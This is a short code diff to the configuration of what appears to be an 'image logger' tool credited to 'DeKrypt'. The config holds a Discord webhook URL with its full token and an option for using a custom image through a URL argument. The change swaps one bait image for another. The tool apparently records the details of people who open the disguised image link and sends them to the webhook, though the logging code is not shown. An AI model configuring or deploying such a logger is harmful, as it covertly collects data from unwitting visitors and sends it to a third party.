@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1484683132836773889/D6in2A895x6Or4dIgk-VqSenNhxP3HTcUaYW-R8i-Hp-Cd3BVCLVTHRMnK2BTYm7u1Uj",
-    "image": "https://png.pngtree.com/png-clipart/20220924/original/pngtree-click-me-3d-button-web-png-image_8629888.png", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfkOIrK-C04DC7zCOQgtDCS5X4ndKbqdj0sA&s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
